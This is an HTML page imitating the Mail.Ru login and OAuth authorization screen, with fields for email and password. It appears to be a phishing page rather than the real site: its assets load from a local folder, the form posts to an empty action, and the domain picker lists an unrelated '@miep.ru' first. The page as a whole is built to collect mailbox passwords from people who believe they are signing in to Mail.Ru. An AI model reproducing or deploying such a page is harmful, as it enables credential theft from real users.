<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="user-scalable=no, initial-scale=1.0">
<link rel="shortcut icon" type="image/x-icon" href="https://img.imgsmail.ru/s/images/icon/favicon.ico">
<title>Авторизация - Почта Mail.Ru</title>
<link rel="stylesheet" type="text/css" href="mail_files/main.css">
<!--[if IE]>
<link rel="stylesheet" type="text/css" href="//img.imgsmail.ru/oauth/master.201609162025/css/main.ie.min.css" />
<![endif]-->

</head>
<body background="mail_files/mobilebg.jpg">
	<div class="page">
		<div class="page__wrapper">
			<div class="page__wrapper__inner">
				<div class="modal" id="modal">
					<div class="header">
						<div class="header__left">
							<div class="header__left__inner">
								<a href="http://mail.ru/" class="logo"><img src="mail_files/logo.png" alt="Mail.Ru" class="logo__img"></a>
							</div>
						</div>
						<div class="header__right">
							<div class="header__right__inner"></div>
						</div>
						<div class="header__shadow"></div>
					</div>
						<form method="post" id="form" action="">
							<div class="content">
								<div class="content__inner">
									<h1 class="content__title">Авторизация в «Mail.Ru»</h1>
									<h2 class="content__subtitle">Авторизуйтесь, чтобы продолжить работу с внешним приложением.</h2>
									<div id="auth" class="auth">
										<div class="b-form__error js-form__error"></div>
									<div class="b-form-row b-form-row_first">
										<input class="b-input" placeholder="Email" name="onelogin" value="" tabindex="5" type="text">
										<input class="b-input" name="login" value="" autofocus="autofocus" tabindex="5" type="hidden">
										<div class="b-select b-select_login">
											<div class="b-select__box">
												<div id="b-select__box__text_js-text" class="b-select__box__text js-text">
																								</div>
											</div>
											<i class="b-select__arrow"></i>
											<select class="b-select__select" tabindex="10" name="Domain" onchange="document.getElementById('b-select__box__text_js-text').innerHTML = this.value;">
												<option value="@miep.ru">@miep.ru</option>
												<option value="@mail.ru">@mail.ru</option>
												<option value="@inbox.ru">@inbox.ru</option>
												<option value="@list.ru">@list.ru</option>
												<option value="@bk.ru">@bk.ru</option>
											</select>
										</div>
									</div>
									<div class="b-form-row">
										<input class="b-input" placeholder="Пароль" name="pass" autofocus="autofocus" tabindex="15" type="password">
									</div>
								<div class="b-form-row b-form-row_remind"><a href="#" class="content__link content__link_remind">Забыли пароль?</a></div>
							</div>
						</div>
						<div class="content__outer"></div>
					</div>
					<div class="footer footer_login">
						<div class="js-footer-controls footer__controls">
							<div class="footer__right">
								<a href="https://e.mail.ru/signup?back=https%3A%2F%2Fo2.mail.ru%2Flogin%3Fclient_id%3Dmail.ru%26response_type%3Dcode%26scope%3Duserinfo%2520mail.imap%26redirect_uri%3Dhttps%253A%252F%252Fauth.mail.ru%252Fcgi-bin%252Foauth2_mailru_callback%252F%26state%3D%2540-3c09a33910f8e43bb8a3ba78ae8c2662%26hide%3Dmarimariwinter%2540mail.ua" data-name="" class="footer__btn footer__btn_reg">
									<span class="footer__btn__text">Зарегистрироваться</span>
									<span class="footer__btn__arrow">&nbsp;→</span>
								</a>
							</div>
							<button data-bem="btn" class="btn btn_main btn_stylish " data-name="user-login">
							<span class="btn__text">Войти</span></button>
							<button data-bem="btn" class="btn btn_stylish " disabled="disabled" data-name="access-denied">
							<span class="btn__text">Отменить</span></button>
						</div>
					</div>

					</form>
				</div>
			</div>
		</div>
	</div>


</body></html>
